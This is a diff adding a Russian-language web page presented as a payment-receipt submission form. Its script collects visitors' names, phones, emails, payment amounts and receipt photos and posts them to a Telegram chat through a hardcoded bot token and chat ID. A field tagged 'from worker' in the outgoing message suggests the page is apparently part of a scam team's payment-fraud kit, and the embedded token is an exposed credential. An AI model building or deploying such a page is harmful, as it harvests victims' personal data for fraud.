@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sending a receipt</title>
+    <link rel="icon" href="images/menu/Recipy.jpg" type="image/png">
+
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700|Open+Sans:400,300,600);
+        
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Open Sans', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #e0eafc, #cfdef3);
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            animation: backgroundAnimation 15s ease infinite;
+        }
+
+        @keyframes backgroundAnimation {
+            0% { background-color: #e0eafc; }
+            50% { background-color: #cfdef3; }
+            100% { background-color: #e0eafc; }
+        }
+
+        .log-form {
+            max-width: 480px; /* Максимальная ширина */
+            width: 90%; /* Адаптивная ширина для мобильных устройств */
+            background: rgba(255, 255, 255, 0.9);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 2em;
+        }
+
+        .log-form h2 {
+            text-align: center;
+            width: 100%;
+            color: #5d5d5d;
+            font-family: 'Open Sans Condensed';
+            font-size: 1.8em;
+            margin: 0;
+            font-weight: 700;
+            color: #ffffff;
+            background: #2a2a2a;
+            padding: 1em;
+            border-radius: 10px;
+        }
+
+        .log-form input,
+        .log-form textarea {
+            border-radius: 10px;
+            display: block;
+            margin: auto;
+            width: 100%;
+            margin-bottom: 1em;
+            padding: .75em 1em;
+            border: 1px solid #eaeaea;
+            color: #757575;
+            font-size: 1em;
+        }
+
+        .log-form input:focus,
+        .log-form textarea:focus {
+            outline: none;
+            border-color: #1fb5bf;
+        }
+
+        .log-form .btn {
+            border-radius: 15px;
+            display: inline-block;
+            background: #1fb5bf;
+            border: none;
+            padding: .75em 2em;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-size: 1.1em;
+        }
+
+        .log-form .btn:hover {
+            background: #23cad5;
+        }
+
+        .warning-container {
+            background: rgba(255, 204, 204, 0.8);
+            border: 1px solid #d9534f;
+            border-radius: 10px;
+            padding-left: 1em;
+            padding-right: 1em;
+            padding-top: 0;
+            
+            margin: 1em 0;
+        }
+        .warning-container h4,p,li {
+            font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+        }
+        .warning-container h4 {
+            text-align: center;
+            font-size: x-large;
+        }
+
+        .warning {
+            color: #d9534f;
+            font-size: 1em;
+            text-align: center;
+            margin: 0;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .log-form {
+                padding: 1.5em; /* Уменьшаем отступы на мобильных устройствах */
+            }
+
+            .log-form h2 {
+                font-size: 1.5em; /* Уменьшаем размер заголовка */
+            }
+
+            .log-form .btn {
+                padding: .5em 1.5em; /* Уменьшаем отступы для кнопки */
+                font-size: 1em; /* Уменьшаем размер шрифта */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .log-form {
+                padding: 1em; /* Еще больше уменьшаем отступы для маленьких экранов */
+            }
+
+            .log-form h2 {
+                font-size: 1.3em; /* Уменьшаем заголовок еще больше */
+            }
+
+            .log-form .btn {
+                padding: .5em 1em; /* Уменьшаем кнопки для маленьких экранов */
+                font-size: 0.9em; /* Уменьшаем размер шрифта кнопки */
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="log-form">
+        <h2>Отправка квитанции</h2>
+        <div class="warning-container">
+            <p class="warning">
+                <h4>🚨 Обратите внимание!</h4>
+                <p><b>Если сумма оплаты не совпадает с:</b></p>
+                <li><b>суммой, на которую Вы заказали,</b></li>
+                <li><b>суммой, указанной в поле "Сумма оплаты",</b></li>
+                <li><b>суммой в квитанции,</b></li>
+                <p><b>то данный платёж не будет засчитан. 💸 Денежные средства будут возвращены в течение 15 минут. ⏳</b></p>
+            </p>
+        </div>
+        <form class="telegram-form" id="telegramForm">
+            <input type="text" name="name" placeholder="Ваше имя (повторно)" autocomplete="off" required />
+            <input type="text" name="phone" placeholder="Ваш телефон (повторно)" autocomplete="off" required />
+            <input type="email" name="email" placeholder="Ваш Email" autocomplete="off" required />
+            <textarea placeholder="Промокод (если есть)" name="text"></textarea>
+            <input type="file" name="file" accept="image/*" required />
+            <input type="number" name="amount" placeholder="Сумма оплаты" required />
+            <button type="submit" class="btn">Отправить</button>
+        </form>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const TOKEN = '7039961825:AAGmyb-lFESj2INpi81JWQAV9kgZwPBtJSU';
+        const CHAT_ID = '-1002294474126';
+        const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+
+        function getCurrentDateTime() {
+            const now = new Date();
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const year = now.getFullYear();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            return `${day}.${month}.${year} | ${hours}:${minutes}`;
+        }
+
+        document.getElementById('telegramForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const name = this.name.value;
+            const phone = this.phone.value;
+            const email = this.email.value;
+            const text = this.text.value;
+            const amount = this.amount.value;
+            const fileInput = this.file.files[0];
+
+            const currentDateTime = getCurrentDateTime();
+
+            const textMessage = `
+                  📝 <b>Новая заявка с сайта</b> 
+                   <b><b><b>────────────────────</b></b></b>
+                🗓 <b>Дата:</b> <b>${currentDateTime}</b>
+                👤 <b>Имя:</b> <i>${name}</i>
+                📞 <b>Телефон:</b> <code>${phone}</code>
+                📧 <b>Email:</b> ${email}
+                💼 <b>От воркера:</b>🆔 <code>${text}</code>
+                💵 <b>Сумма оплаты:</b> <b>${amount} ₽</b>
+            `.replace(/^\s+/gm, ''); // Убираем отступы в начале строк
+
+            // Отправка фото и текста
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', fileInput);  // Загружаем фото
+            formData.append('caption', textMessage.trim()); // Добавляем текст сообщения
+            formData.append('parse_mode', 'HTML'); // Добавляем параметр parse_mode
+
+            fetch(URI_API_PHOTO, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Форма успешно отправлена!');
+                    this.reset();
+                } else {
+                    alert('Произошла ошибка, попробуйте еще раз.');
+                }
+            })
+            .catch(error => {
+                alert('Произошла ошибка, попробуйте еще раз.');
+            });
+        });
+    });
+</script>
+</body>
+</html>
